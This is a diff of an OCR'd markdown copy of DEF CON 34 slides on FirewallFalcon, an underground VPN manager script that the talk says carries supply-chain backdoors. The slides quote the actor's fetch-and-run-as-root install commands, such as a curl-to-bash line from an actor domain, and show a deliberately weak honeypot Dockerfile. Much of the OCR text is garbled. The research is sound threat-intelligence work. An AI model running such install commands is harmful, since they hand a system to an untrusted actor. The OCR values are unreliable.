@@ -4,17 +4,21 @@ speakers: ["Assaf Morag"]
 conference: "DEF CON"
 conference_full: "DEF CON 34"
 edition: "34"
-year: null
+year: 2026
 source_pdf: "DEF CON 34/DEF CON 34 - Assaf Morag - Hacking the Hackers who Hack Hackers Supply-Chain Backdoors in Underground VPN Infrastructure - v2.pdf"
 pages: 144
 sha256: "22521e71cd216569b3b7b7adbc995a83837c3636dd082c853f70d5759bca6665"
-text_chars: 60940
-ocr_pages: 105
+text_chars: 50210
+ocr_pages: 91
 has_ocr: true
 redacted_secrets: 0
+ocr_confidence: 87.5
+ocr_unreliable_blocks: 2
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2 + tesseract"
-converted_at: "2026-08-12T00:14:42Z"
+converted_at: "2026-08-12T06:24:17Z"
 ---
 # Hacking the Hackers who Hack Hackers Supply-Chain Backdoors in Underground VPN Infrastructure
 
@@ -22,29 +26,12 @@ converted_at: "2026-08-12T00:14:42Z"
 **Conference:** DEF CON 34  
 **Source:** `DEF CON 34/DEF CON 34 - Assaf Morag - Hacking the Hackers who Hack Hackers Supply-Chain Backdoors in Underground VPN Infrastructure - v2.pdf` (144 pages)
 
+
 ## Slide 1
 
 **Hacking the Hackers Who Hack Hackers Supply-Chain Backdoors in Underground VPN Infrastructure Assaf Morag**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-Hacking the Hackers
-Who Hack Hackers
-Supply-Chain Backdoors in Underground
-VPN Infrastructure
-Assaf Morag
-+ flare
-```
-
 ## Slide 2
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-= “aye FirewallFalcon
-Journey ;
-```
 
 ## Slide 3
 
@@ -58,18 +45,12 @@ Journey ;
 
 **HONEYPOTS RUNNING ON CONTAINERS**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-HONEYPOTS RUNNING ON CONTAINERS
-+ flare
-```
-
 ## Slide 6
 
 **HONEYPOTS RUNNING ON CONTAINERS**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 HONEYPOTS RUNNING ON CONTAINERS
@@ -92,14 +73,14 @@ sed -i 's/*#\?PasswordAuthentication .*/PasswordAuthentication yes/' /etc/ssh/ss
 EXPOSE 22
 CMD ["/usr/sbin/ssh
 ubuntu@FlareResearch:~/Honeypots/SSH$ |
-+ flare
 ```
 
 ## Slide 7
 
 **HONEYPOTS RUNNING ON CONTAINERS**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 HONEYPOTS RUNNING ON CONTAINERS
@@ -114,51 +95,42 @@ RUN echo "root:root" | chpasswd
 
 **IN ONE OF THESE ATTACKS**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 IN ONE OF THESE ATTACKS
 ubuntu@FlareResearch:~/Honeypots/SSH$ cat attack_dump_3
 {
-"@timestamp": "2026-01-25T12:42:18.481Z"
 "attack_number": 379,
 "event_type": "SSH_Honeypot",
-Mhostsnt
 "hostname": "XX.XX.XX.XX"
 }
-Mii staofahiles* sa
 {
-"name": "“menu.sh",
 "origin": "https://raw.githubusercontent.com/firewallfalcons/FirewallFalcon—Manager/main/menu.sh",
-"sha256": "6cflb4c3b2b0f7d7e9b8ded8Ff65c6b2cxxxxxXXXXXXXXXXXXXXXXXXXXXXK",
 "downloaded": true
 "name": "install_mod",
 "origin "https://raw.githubusercontent.com/firewallfalcons/ProxyMods/main/install.sh",
-"Sha256": "dbd52a18d2c9c16b4abfxxxxxxxXxXXXXXXXXXXXXXXXXXXKXXXXXXK",
 "downloaded": true
 "name" install.sh",
 "origi "https://raw.githubusercontent.com/firewallfalcons/FirewallFalcon-Manager/main/install.sh"
 "repository": "FirewallFalcon-—Manager"
 "downloaded": true
-1,
 "network": {
 "protocol "HTTPS"
 "user_age curl/8.5.0"
-y
 }
-ubuntu@FlareResearch: ~/Honeypots/SSH$ 0
 ```
 
 ## Slide 10
 
 **IN ONE OF THESE ATTACKS**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 70/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 IN ONE OF THESE ATTACKS
-IMeEMaTs Tsimeteail. sin",
-"origin": "https://raw.githubusercontent.com/firewallfalcons/FirewallFalcon-Manager/main/install.sh",
 "repository": "FirewallFalcon-Manager",
 "downloaded": true
 ```
@@ -167,23 +139,15 @@ IMeEMaTs Tsimeteail. sin",
 
 **CROWDSTRICK’S FIREWALL FALCON MANAGER**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-CROWDSTRICK’S FIREWALL FALCON MANAGER
-+ flare
-```
-
 ## Slide 12
 
 **DOWNLOADED FROM GITHUB**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 65/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 DOWNLOADED FROM GITHUB
-"name": We = =
-"Origin"# "https://raw.githubusercontent.com/firewallfalcons/f#FirewallFalcon—Manager/ma
 "reposito
 "downloaded": true
 ```
@@ -194,7 +158,8 @@ DOWNLOADED FROM GITHUB
 
 Deleted in May 2026 New and modified tool available now on: https://codeberg.org/firewallfalcons
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 THE GITHUB REPOSITORY
@@ -267,7 +232,8 @@ VPN?
 
 **A LEAD TO A TELEGRAM GROUP**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 A LEAD TO A TELEGRAM GROUP
@@ -275,14 +241,14 @@ A LEAD TO A TELEGRAM GROUP
 e Telegram Channel: t.me/firewallfalcons - Join for updates and support!
 FIREWALL
 FALCONS
-+ flare
 ```
 
 ## Slide 21
 
 **DISCOVERY: FINDING LEADS**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 84/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
 4 SHODAN Explore Downloads Pricing @ "t.me/firewallfalcons" Account
@@ -341,16 +307,15 @@ More...
 
 **TELEGRAM LANGUAGE DISTRIBUTION**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 TELEGRAM LANGUAGE DISTRIBUTION
 | LANGUAGE DISTRIBUTION
 LANGUAGE
-/ 27,92%
 © Latin/English 72.08%
 72,08% Arabic 27,92%
-——
 +flare
 ```
 
@@ -358,7 +323,8 @@ LANGUAGE
 
 **TELEGRAM MENTIOND COUNTRIES DISTRIBUTION**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 77/100 on the text kept, 70/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 TELEGRAM MENTIOND COUNTRIES DISTRIBUTION
@@ -367,21 +333,15 @@ COUNTRY
 ©) Morocco
 Big UK
 fm Egypt
-© Ghana
 8 India
 lraq
 (Sm Sudan
-OB ireland
 fem Jordan
 GIS Kenya
 & Brazil
-(®) Saudi
-(9 Algeria
 = Syria
 (®) Saudi Arabia
-(6) Tunisia
 G™ Chile
-(] Germany
 OB Nigeria
 ```
 
@@ -389,15 +349,13 @@ OB Nigeria
 
 **MALICIOUS ACTIVITY IN THE TELEGRAM GROUPS**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 MALICIOUS ACTIVITY IN THE TELEGRAM GROUPS
-FirewallFalcon ]
 ’) OstoraPremium App Source Code FOR SALE ¢§
 ¥ “4 Contact: @FirewallFalcon
-ale
-(
 = OstoraOrg Q
 Ostora TV a —
 Watch Live TV Sports Channel and ive spon =
@@ -406,21 +364,19 @@ sia) Fast Free Secure
 DOWNLOAD OSTORA TV APK
 Security Verified
 GD cmsecurity G Lookout [YJ McAfee
-a YON
 Download Ostora TV APK to watch live TV, sports, and movies in HD.
 Enjoy ad-free streaming, offline videos and multiple languages easily.
-+ flare ———.
 ```
 
 ## Slide 27
 
 **MALICIOUS ACTIVITY IN THE TELEGRAM GROUPS**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 95/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 MALICIOUS ACTIVITY IN THE TELEGRAM GROUPS
-+ flare
 FirewallFalcon
 Private service: Hacking any IPTV.
 Create your own IPTV.
@@ -437,7 +393,8 @@ Hack any live football match websites.
 
 **3**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 MALICIOUS ACTIVITY IN THE TELEGRAM GROUPS
@@ -446,24 +403,15 @@ Discounted dedicated servers with full root access.
 ® Prices drop over time + %& Refurbished hardware + i?) EU
 datacenters
 Perfect for budget projects, labs, and long-term servers.
-=) & https://www.hetzner.com/sb/
 ~
 » Hetzner
 Refurbished server for sale in Hetzner Server Auction
 Be quick and save money: Top and cheap refurbished dedicated
 servers at Hetzner Server Auction
-ya
-a
-a)
 FirewallFalcon
 3 SCAM ALERT - WARNING T...
 I bought a VPS, but it's not working.
-é .
-27 @.;
-3 © 3881 # 4:53PM
-+ flare
 Deleted Account
-9
 I bought a VPS, but it's not working.
 He scammed you, you dummy. ‘3
 ```
@@ -472,11 +420,11 @@ He scammed you, you dummy. ‘3
 
 **MALICIOUS ACTIVITY IN THE TELEGRAM GROUPS**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 MALICIOUS ACTIVITY IN THE TELEGRAM GROUPS
-ae
 FirewallFalcon
 9 Nant a full tutorial on TCP Bypass Proxy?
 ‘| Learn how to bypass restrictions like a pro!
@@ -490,12 +438,9 @@ FirewallFalcon
 __ If You have a clean Vps Contact me to do the tutorial on it
 | Ubuntu 20.04.6 LTS is recommended
 | x86-64 architecture
-‘|
 @firewallfalcon
 © Leave a comment
 June 4, 2025
-+ flare
-Mea) |
 FirewallFalcon
 Want a full tutorial on TCP Bypass Proxy?
 ~ Learn how to bypass restrictions like a pro!
@@ -505,7 +450,6 @@ GBD 19 comments
 FirewallFalcon
 9 Want a full tutorial on TCP Bypass Proxy? Lal Learn...
 If You have a clean Vps Contact me to do the tutorial on it
-wi
 Ubuntu 20.04.6 LTS is recommended
 x86-64 architecture
 @firewallfalcon
@@ -516,66 +460,41 @@ a & 7 v 1 © 3346 edited 3:45PM
 
 ### **MALICIOUS ACTIVITY IN THE TELEGRAM GROUPS**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-MALICIOUS ACTIVITY IN THE TELEGRAM GROUPS
-Rememene)
-+ flare >
-```
-
 ## Slide 31
 
 **TELEGRAM CONTENT ANALYSIS**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 83/100 on the text kept, 69/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-_
 CONTENT TYPE MSGS % OF 329
 G FirewallFalcon related 1 57
 FIREWALL (infrastructure / artifacts / URLs / ee eee | F 48.0%
 FALCON configs / logs / panels / etc.) (48%)
 Tunnel / VPN /
-aoe oe 267.0%
 @)) Carrier-name oe
 A targeting 14 4.3%
-ax ,
 Hacking / 9
-("e)) recon tooling a 11 26a %o
 Payment / ny
 ES monetization at 6 1.8%
-be Cracked / 0
 © pirated releases ie: 3 0.9%
-Other content Oe a a a gr “fy ‘
-(ay (not shown) a uN rN Pear eR Er al 221 67.2%
 NUMBER OF MESSAGES
 | FIREWALLFALCON RELATED CONTENT: 157 MESSAGES (48% OF TOTAL 329)
-4
 ```
 
 ## Slide 32
 
 **TELEGRAM CONTENT ANALYSIS**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 80/100 on the text kept, 61/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-,
-<
-|
-~eeeu
-Sutwews
-Pai
 CONTENT TYPE MSGS : %OF 1,661 )
-|
 FirewallFalcon related |
-Geen Ss 165 loo, | |
 sere configs / logs / panels / etc.) (10.00%)
-:
-=@) config | . 2 59 3.55%
 H 9,
-lls peat —= 14 084%
 ay Hacking / 5
 NUMBER OF MESSAGES .
 2 a MESSAGES IN DISPLAYED CATEGORIES OTHER CONTENT — \
@@ -587,7 +506,8 @@ L G FIREWALLFALCON RELATED CONTENT: 165 MESSAGES (10.90% OF TOTAL 1,661) )
 
 ### **ANALYZING THE FIREWALL FALCON RELATED CONTENT**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 ANALYZING THE FIREWALL FALCON RELATED CONTENT
@@ -597,17 +517,14 @@ Ultimate SSH Manager for ARM & x64 devices Mill
 “X Now’s your chance to help shape it!
 Do YOU want any specific features?
 Any modifications you'd like to see?
-| @ under Development “ &%
-bu |.
-SBD vocommens
->flare
 ```
 
 ## Slide 34
 
 ### **ANALYZING THE FIREWALL FALCON RELATED CONTENT**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 ANALYZING THE FIREWALL FALCON RELATED CONTENT
@@ -615,7 +532,6 @@ FirewallFalcon Manager v1.0
 SYSTEM RESOURCES
 FirewallFalcon Manager v
 |
-i
 SYSTEM RESOURCES
 USER MANAGEMENT
 Create New User 5) Unlock User Account
@@ -640,25 +556,25 @@ Select an option: Jj
 
 **ANALYZING THE FIREWALL FALCON RELATED CONTENT**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 ANALYZING THE FIREWALL FALCON RELATED CONTENT
 June 19, 2025
-4 | FirewallFalcon
 r Photo
 | @ New Feature Suggestion!
 Would you like us to add a Cloudflare Domain Option (} to the
 script? © 2707 4:42 PM
 »D 9 comments
-+ flare
 ```
 
 ## Slide 36
 
 **ANALYZING THE FIREWALL FALCON RELATED CONTENT**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 ANALYZING THE FIREWALL FALCON RELATED CONTENT &)
@@ -670,70 +586,57 @@ optimized for speed, stealth, and bypassing ISP restrictions? =» Be
 vv Also — does UDP work on your network for free?
 /
 aD 9 comments
-+ flare
 ```
 
 ## Slide 37
 
 ### **ANALYZING THE FIREWALL FALCON RELATED CONTENT**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 ANALYZING THE FIREWALL FALCON RELATED CONTENT
 _ FirewallFalcon
 _ & Testing a New SSL Tunnel
-¢
 \ g SSH over HAProxy SSL is now being tested!
 °
 «> This method could help bypass fingerprinting by firewalls and
 improve stealth.
 If you're interested in trying it out or want more details, drop a
 reaction below! <}
-&@ W222 A212
-a) 4 comments
-+ flare
 ```
 
 ## Slide 38
 
 **ANALYZING THE FIREWALL FALCON RELATED CONTENT**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 72/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 ANALYZING THE FIREWALL FALCON RELATED CONTENT
-+ flare
-FirewallFaicon
-| FirewallFalcon
 Photo
 of New Feature Poll
 Yes
 No
 © Leave a comment
-* —
 _ Should we add v2ray DNSTT support to the script?
 ©
-4
-0
 ```
 
 ## Slide 39
 
 ### **ANALYZING THE FIREWALL FALCON RELATED CONTENT**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 ANALYZING THE FIREWALL FALCON RELATED CONTENT
 Sle eee, November 18,2025 |
-Oh ASRS
- FirewallFalcon
- FirewallFalcon Manager Update Coming Soon
-5
-|
+FirewallFalcon Manager Update Coming Soon
 __ Anew update is on the way with enhanced SSH user
-management.
 If a user exceeds their usage limits, they will be disconnected from
 all devices and locked for 120 seconds before regaining access.
 © 2668
@@ -744,7 +647,6 @@ UNINSTALL the old script entirely. Bb
 BACKUP your users first! Do not forget this. P*4
 INSTALL the new version below: =»
 bash <(curl -fsSL https://thefirewoods.org)
-+ flare # _—_—
 ```
 
 ## Slide 40
@@ -757,27 +659,17 @@ bash <(curl -fsSL https://thefirewoods.org)
 
 **CRUSH COURSE ON VPN**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 96/100 on the text kept, 57/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 CRUSH COURSE ON VPN
-= =G) Encrypted tunnel.
-Client ss
 VPN Server
-+ flare
 ```
 
 ## Slide 43
 
 **WHY USE A VPN?**
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-WHY USE A VPN?
-PRIVACY
-+flare
-```
 
 ## Slide 44
 
@@ -795,86 +687,74 @@ PRIVACY
 
 **WHAT DOES FIREWALL FALCON OFFER?**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 61/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 WHAT DOES FIREWALL FALCON OFFER?
-—
-fr \
-—<. — .O!S~C~C«~N
-il = HTTPS > =} ~---2>\ (Unknown
-[ AN 2 fo internal
-| Clier P — = iq routing)
 jen gf
 Web Server —
 ail —
-—>| : -<---> =>
-ZS
 Client Obfuscated Tunnelcore Routing rules Outbound
 transport
-+ flare
 ```
 
 ## Slide 46
 
 **LET’S INSTALL (AS A CONTAINER)**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 83/100 on the text kept, 78/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
 LET’S INSTALL (AS A CONTAINER)
 ubuntu@FlareResearch:~/Research/February-26/FirewallFalcon$ sudo docker build -t tests/firewallfalcon .
 [+] Building 19. a8 (9/9) PASS docker:default
 r from Dockerfile Q.0s
-Q@.0s
 rary/ubuntu:
-. 70kB
 update && apt-—ge
 ./FirewallFalcon
 c445b7caba8
 8@aac
 > => unpacking to docker sts/firewallfalcon:
-aianitucriarensscarcn: 2 /Research/February-26/eirewallpalcons sudo docker run -dit tests/firewallfalcon
-df928c69dc21801c508999 F8bdc5ca237b2dc56c74fb1be7a0646b48438Fd618
 ubuntu@FlareResearch:~/Research/February-26/FirewallFalcon$ sudo docker ps -a
 CONTAINER ID IMAGE COMMAND CREATED STATUS NAMES
 df928c69dc21 tests/firewallfalcon "sh ./FirewallFalcon.." 3 seconds ago Exited (8) 2 seconds ago bold_kilby
-2d53844b97f1  £259b650c524 "sh ./FirewallFalcon.." 2 minutes ago Exited (127) 2 minutes ago goofy_diffie
+2d53844b97f1 £259b650c524 "sh ./FirewallFalcon.." 2 minutes ago Exited (127) 2 minutes ago goofy_diffie
 ```
 
 ## Slide 47
 
 ### **LET’S INSTALL (FROM INSIDE A CONTAINER)**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 65/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 LET’S INSTALL (FROM INSIDE A CONTAINER)
-‘root@ac41f4243a45: /FirewallFalcon—Manager# ./install.sh
 Installing FirewallFalcon Manager...
-dele aC hh PMR Ve se meCUr] —L —o install.sh "https://raw.githubusercontent.com/firewallfalcons/FirewallFalcon-Manager
 /main/install.sh" && chmod +x install.sh && sudo ./install.sh && rm install.sh
-+ flare
 ```
 
 ## Slide 48
 
 **LET’S INSTALL (NON-ROOT)**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 LET’S INSTALL (NON-ROOT)
 ubuntu@FlareResearch:~/Containers/FirewallFalcon-Manager$ ./install.sh
 Error: This script must be run as root.
-+ flare
 ```
 
 ## Slide 49
 
 **LET’S INSTALL (ON A NEW VM-LAB)**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 LET’S INSTALL (ON A NEW VM-LAB)
@@ -894,19 +774,17 @@ Configuring user limiter service...
 @ Setup finished.
 Installation complete!
 Type 'menu' to start.
-root@ip-172-31-32-128:~# [J
-+ flare
 ```
 
 ## Slide 50
 
 **LET’S PLAY**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 LET’S PLAY
-+ flare
 @ Select
 Ubuntu 24.04.3 LTS
 22.60% Used
@@ -917,11 +795,9 @@ Renew User Account
 Lock User Account
 Protocol Manager
 DT Proxy Manager
-53
 CloudFlare Free Domain
 SSH Banner Config
 Auto-Reboot Task
-é
 Uninstall Script
 an option: |
 | Uptime: 6 hours, 41 minutes
@@ -943,7 +819,8 @@ Q@] Exit
 
 **LET’S PLAY**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 LET’S PLAY
@@ -953,17 +830,16 @@ Users 1 Managed Accounts | Sys Load (1m): @.02
 @M User 'test_user' created successfully!
 ® Username: test_user
 Password: 123456
-Expires on: 2026-02-12
 Gf Connection Limit:
 Do you want to generate a client connection config for this user? (y/n): ff
-+ flare
 ```
 
 ## Slide 52
 
 **LET’S PLAY**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 LET’S PLAY
@@ -983,11 +859,11 @@ Press [Enter] to return to the menu...
 
 **LET’S PLAY**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 LET’S PLAY
-+ flare
 @ Select
 Ubuntu 24.04.3 LTS
 22.60% Used
@@ -998,11 +874,9 @@ Renew User Account
 Lock User Account
 Protocol Manager
 DT Proxy Manager
-53
 CloudFlare Free Domain
 SSH Banner Config
 Auto-Reboot Task
-é
 Uninstall Script
 an option: |
 | Uptime: 6 hours, 41 minutes
@@ -1024,14 +898,14 @@ Q@] Exit
 
 **LET’S PLAY**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 LET’S PLAY
 os Ubuntu 24.04.3 LTS | Uptime: 6 hours, 43 minutes
 Memory 22.59% Used | Online Sessions: @
 Users 1 Managed Accounts | Sys Load (1m): 0.00
----— TUNNELLING PROTOCOLS---
 1] # Install badvpn (UDP 7300) (Inactive)
 2] — Uninstall badvpn
 3] # Install udp-custom (Inactive)
@@ -1050,21 +924,20 @@ waa MANAGEMENT PANELS -——-—
 [13] = Uninstall X-UI Panel
 [ @] Return to Main Menu
 @ Select an option: J
->flare
 ```
 
 ## Slide 55
 
 **LET’S PLAY**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 LET’S PLAY
 os Ubuntu 24.04.3 LTS | Uptime: 6 hours, 43 minutes
 Memory 22.59% Used | Online Sessions: @
 Users 1 Managed Accounts | Sys Load (1m): 0.00
----— TUNNELLING PROTOCOLS---
 1] # Install badvpn (UDP 7300) (Inactive)
 2] — Uninstall badvpn
 3] # Install udp-custom (Inactive)
@@ -1083,14 +956,14 @@ wa MANAGEMENT PANELS ---
 [13] = Uninstall X-UI Panel
 [ @] Return to Main Menu
 @ Select an option: J
->flare
 ```
 
 ## Slide 56
 
 **LET’S PLAY**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 LET’S PLAY
@@ -1110,14 +983,14 @@ Press [Enter] to return to the menu...
 
 **LET’S PLAY**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 LET’S PLAY
 os Ubuntu 24.04.3 LTS | Uptime: 6 hours, 43 minutes
 Memory 22.59% Used | Online Sessions: @
 Users 1 Managed Accounts | Sys Load (1m): 0.00
----— TUNNELLING PROTOCOLS---
 1] # Install badvpn (UDP 7300) (Inactive)
 2] — Uninstall badvpn
 3] # Install udp-custom (Inactive)
@@ -1136,21 +1009,20 @@ wa MANAGEMENT PANELS ---
 [13] = Uninstall X-UI Panel
 [ @] Return to Main Menu
 @ Select an option: J
->flare
 ```
 
 ## Slide 58
 
 **LET’S PLAY**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 LET’S PLAY
 Ubuntu 24.04.3 LTS | Uptime: 6 hours, 5@ minutes
 23.86% Used | Online Sessions: @
 1 Managed Accounts | Sys Load (1m): @.02
-™
 % Forcing release of Port 53 (stopping systemd-resolved)...
 ® Checking if port 53 (UDP) is available...
 M Port 53 (UDP) is free to use.
@@ -1165,7 +1037,8 @@ Please choose where DNSTT should forward traffic:
 
 **LET’S PLAY**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 LET’S PLAY
@@ -1174,21 +1047,20 @@ Your connection details:
 — Public Key:
 — Forwarding To: V2Ray (port 8787)
 — Action Required: Ensure a V2Ray service (vless/vmess/trojan) listens on port 8787 (no TLS)
-+ flare
 ```
 
 ## Slide 60
 
 **LET’S PLAY**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 LET’S PLAY
 os Ubuntu 24.04.3 LTS | Uptime: 6 hours, 43 minutes
 Memory 22.59% Used | Online Sessions: @
 Users 1 Managed Accounts | Sys Load (1m): 0.00
----— TUNNELLING PROTOCOLS---
 1] # Install badvpn (UDP 7300) (Inactive)
 2] — Uninstall badvpn
 3] # Install udp-custom (Inactive)
@@ -1207,19 +1079,18 @@ wa MANAGEMENT PANELS ---
 [13] = Uninstall X-UI Panel
 [ @] Return to Main Menu
 @ Select an option: J
->flare
 ```
 
 ## Slide 61
 
 **LET’S PLAY**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 LET’S PLAY
 WebBasePath:
-BREE PERS SELLS SSS SSeS ses eSsss ses yessssssssessasa
 If you forgot your login info, you can type 'x-ui settings' to check
 Start migrating database...
 Migration done!
@@ -1244,7 +1115,6 @@ x-ui install Install
 x-ui uninstall Uninstall
 Control Menu Usage
 Press [Enter] to return to the menu...
-+ flare
 ```
 
 ## Slide 62
@@ -1253,23 +1123,23 @@ Press [Enter] to return to the menu...
 
 Tool’s UI – available on http://IP_ADDRESS:43237/<<Random_String>>
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
